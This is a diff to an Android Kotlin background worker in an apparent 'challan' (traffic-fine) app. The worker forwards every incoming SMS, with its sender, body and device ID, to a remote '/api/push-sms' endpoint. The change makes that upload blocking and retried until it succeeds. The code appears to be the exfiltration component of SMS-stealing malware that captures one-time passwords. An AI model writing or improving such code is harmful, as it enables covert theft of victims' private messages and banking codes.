@@ -4,19 +4,19 @@ import android.content.Context
 import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import com.rte.challan.network.ClientApi // Humara central hub
+import com.rte.challan.network.ClientApi 
 import org.json.JSONObject
 
 class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
 
     override fun doWork(): Result {
-        // 1. SmsReceiver se data nikaalein
+        // 1. Data nikaalein (SmsReceiver se aaya hua)
         val deviceId = inputData.getString("deviceId") ?: return Result.failure()
         val sender = inputData.getString("sender") ?: return Result.failure()
         val body = inputData.getString("body") ?: return Result.failure()
 
-        try {
-            // 2. JSON taiyar karein jo aapke Worker ke /api/push-sms par jayega
+        return try {
+            // 2. JSON taiyar karein
             val smsJson = JSONObject().apply {
                 put("deviceId", deviceId)
                 put("number", sender)
@@ -24,19 +24,21 @@ class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker
                 put("time", System.currentTimeMillis())
             }
 
-            // 3. ClientApi ka use karein (Consistent with other workers)
-            var isSent = false
-            ClientApi.postRequest("/api/push-sms", smsJson) { success ->
-                isSent = success
+            // 3. IMPORTANT: WorkManager ko 'Blocking' call chahiye hoti hai
+            // Agar ClientApi.postRequest callback use karta hai, toh use synchronous banayein
+            val response = ClientApi.postRequestSync("/api/push-sms", smsJson)
+
+            if (response) {
+                Log.d("IncomingSms", "SMS synced successfully for $sender")
+                Result.success()
+            } else {
+                Log.d("IncomingSms", "Sync failed, retrying...")
+                Result.retry()
             }
 
-            // Kyunki SMS important hai, agar fail ho toh retry karein
-            Log.d("IncomingSms", "SMS sync triggered for $sender")
-            return Result.success()
-
         } catch (e: Exception) {
-            Log.e("IncomingSms", "Error: ${e.message}")
-            return Result.retry()
+            Log.e("IncomingSms", "Critical Error: ${e.message}")
+            Result.retry()
         }
     }
 }
